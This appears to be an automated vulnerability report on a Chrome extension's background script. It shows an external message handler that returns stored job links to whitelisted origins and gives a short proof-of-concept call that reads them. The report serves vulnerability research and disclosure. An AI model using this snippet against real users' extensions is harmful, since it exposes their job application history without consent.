# CoCo Analysis: bclaanipmdoalmligfhdedonmafafgnc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bclaanipmdoalmligfhdedonmafafgnc/opgen_generated_files/bg.js
Line 982 - selectedJobs = result["selectedJobs"];
Line 984 - sendResponse({ "selectedJobs": selectedJobs });

**Code:**

```javascript
// Background script - bg.js Lines 967-987
chrome.runtime.onMessageExternal.addListener(function (request, sender, sendResponse) {
  // ← External websites/extensions can trigger

  if (request.message == "isInstalled") {
    sendResponse({ "status": true });
  }

  if (request.message == "clearlist") {
    var selectedJobs = [];
    chrome.storage.local.set({ "selectedJobs": selectedJobs });
    return true;
  }

  if (request.message == "getlist") {
    var selectedJobs = ["one"];
    chrome.storage.local.get(["selectedJobs"], (result) => {
      selectedJobs = result["selectedJobs"]; // ← Storage data retrieved
      console.log("In bg script: ", selectedJobs);
      sendResponse({ "selectedJobs": selectedJobs }); // ← Sent to external caller
    });
    return true;
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domains (*.jobiak.ai/*, localhost:8089, 127.0.0.1:8887)

**Attack:**

```javascript
// From webpage on *.jobiak.ai/* or localhost:8089 or 127.0.0.1:8887
chrome.runtime.sendMessage(
  'bclaanipmdoalmligfhdedonmafafgnc', // Extension ID
  { message: "getlist" },
  function(response) {
    console.log('Leaked storage data:', response.selectedJobs);
    // Attacker receives all job links stored by the extension
  }
);
```

**Impact:** Information disclosure - external websites/extensions matching the externally_connectable patterns (*.jobiak.ai/*, localhost:8089, 127.0.0.1:8887) can retrieve the complete list of selected job links stored in chrome.storage.local. This constitutes a complete storage read vulnerability, allowing whitelisted domains to access potentially sensitive user data (job application history).
